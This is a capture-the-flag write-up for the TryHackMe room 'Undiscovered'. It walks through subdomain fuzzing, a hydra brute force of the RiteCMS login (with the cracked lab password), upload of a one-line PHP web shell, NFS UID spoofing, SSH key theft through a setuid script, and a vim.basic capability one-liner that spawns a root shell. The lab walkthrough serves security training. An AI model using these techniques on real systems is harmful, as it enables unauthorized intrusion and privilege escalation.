# 45 - Undiscovered (NFS, capabilities\[vim.basic exploitation])

Room Link --> [https://tryhackme.com/room/undiscoveredup](https://tryhackme.com/room/undiscoveredup)

Please consider adding `undiscovered.thm` in /etc/hosts

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vv undiscovered.thm -sV -p- -T4

PORT      STATE SERVICE  REASON  VERSION
22/tcp    open  ssh      syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp    open  http     syn-ack Apache httpd 2.4.18
111/tcp   open  rpcbind  syn-ack 2-4 (RPC #100000)
2049/tcp  open  nfs      syn-ack 2-4 (RPC #100003)
34636/tcp open  nlockmgr syn-ack 1-4 (RPC #100021)
```
{% endcode %}

Didn't find anything in NFS or RPCBind port, even Gobuster enumeration.

So i went ahead to do a subdomain enumeration with wfuzz.

{% code overflow="wrap" lineNumbers="true" %}
```bash
wfuzz -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://undiscovered.thm" -H "Host: FUZZ.undiscovered.thm" -t 42 --sc 200

# output
http://deliver.undiscovered.thm
```
{% endcode %}

<figure><img src=".gitbook/assets/image (318).png" alt=""><figcaption></figcaption></figure>

Found an authenticated RCE for the RiteCMS.

#### Gobuster enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://deliver.undiscovered.thm/ -w /usr/share/dirb/wordlists/common.txt -t 500 --no-error -b 404,404,500,403,502 -x txt,php,db,sql,html

/cms
/data
/files
/index.php
/index.php
/js
/LICENSE
/media
/README.txt
/templates
```
{% endcode %}

`/data`&#x20;

<figure><img src=".gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure>

In the `mysql.initial.sql and sqlite.user.initial.sql` file we found credentials for admin user:

{% code overflow="wrap" lineNumbers="true" %}
```bash
INSERT INTO phpsqlitecms_userdata VALUES(1, 'admin', 1, '75470d05abd21fb5e84e735d2bc595e2f7ecc5c7a5e98ad0d7', 1230764400, 0);
# cant crack the password. so lets bruteforce the page since we know username as admin with hydra
```
{% endcode %}

#### Hydra.

`hydra -l admin -P /usr/share/wordlists/rockyou.txt -t64 -m '/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong' deliver.undiscovered.thm http-post-form` .

{% code overflow="wrap" %}
```bash
[80][http-post-form] host: deliver.undiscovered.thm   login: admin   password: liverpool
```
{% endcode %}

And we got the password.

<figure><img src=".gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>

Using this [exploit](https://www.exploit-db.com/exploits/48636)

{% code overflow="wrap" %}
```
1- Go to following url. >> http://(HOST)/cms/
3- Go to "Filemanager" and press "Upload file" button.
4- Choose your php web shell script and upload it. 
      (
PHP Web Shell Code == <?php system($_GET['cmd']); ?>

5- You can find uploaded file there. >> http://(HOST)/media/(FILE-NAME).php
6- We can execute a command now. >> http://(HOST)/media/(FILE-NAME).php?cmd=id
```
{% endcode %}

And i got shell:

<figure><img src=".gitbook/assets/image (321).png" alt=""><figcaption></figcaption></figure>

### PrivEsc to WIlliam

#### NFS exploitatiion

Uploaded `linEnum.sh` to the victim to enumerate and found an NFS share.

<figure><img src=".gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>

But there is `root_squash` feature enabled meaning even if we mount the file share we wont have full root permissions over it. For this we have to create a user with the same UID and GID as williams in order to access this share.

This is the detail for williams from /etc/passwd: `william:3003:3003::/home/william:/bin/bash` .

We have to create called william with same UID on our kali.

```bash
useradd -u 3003 william
# make sure to:
- create a dir for william in the /home dir.
- change his shell to /bin/bash.

# Mount his homefolder
mount -t nfs 10.10.223.42:/home/william /home/william

# switch to william.
su wiliam
```

now we can access his files.

<figure><img src=".gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>

Change the permission of `/home/william` to 777 so we can have full acess from the `www-data` user account.

<figure><img src=".gitbook/assets/image (327).png" alt=""><figcaption></figcaption></figure>

Now we have access:

<figure><img src=".gitbook/assets/image (326).png" alt=""><figcaption></figcaption></figure>

We can also see that the owner for `script` file changed from `nodoby` to `leonard` .

The `script` file when run against strings, we see it also execute `cat` ie, `strings script`.

<figure><img src=".gitbook/assets/image (328).png" alt=""><figcaption></figcaption></figure>

So since it is running a `leonard` user, we can cat his `ssh private keys` .

<figure><img src=".gitbook/assets/image (329).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (330).png" alt=""><figcaption></figcaption></figure>

### &#x20;Priv Esc to root

I saw that vim had capabilities set when i wan enumerating with linENUM.sh earlier.

> getcap -r / 2>/dev/null

<figure><img src="https://miro.medium.com/v2/resize:fit:471/1*C4J4S45cYahdw4v2MpCvCg.png" alt="" height="121" width="685"><figcaption><p>getcap</p></figcaption></figure>

Well so **vim.basic** has the cap of **setuid.** Reference to **gtfobins**, exec this command to get root shell:

Oh wait, it’s not working! Let’s try again with **py3(python3):**

> /usr/bin/vim.basic -c ‘:py3 import os; os.setuid(0); os.execl(“/bin/sh”, “sh”, “-c”, “reset; exec sh”)’

<figure><img src="https://miro.medium.com/v2/resize:fit:140/1*SkkmzJ3HkBcPt3I_EzUmIA.png" alt="" height="105" width="203"><figcaption><p>root shell</p></figcaption></figure>

Done!
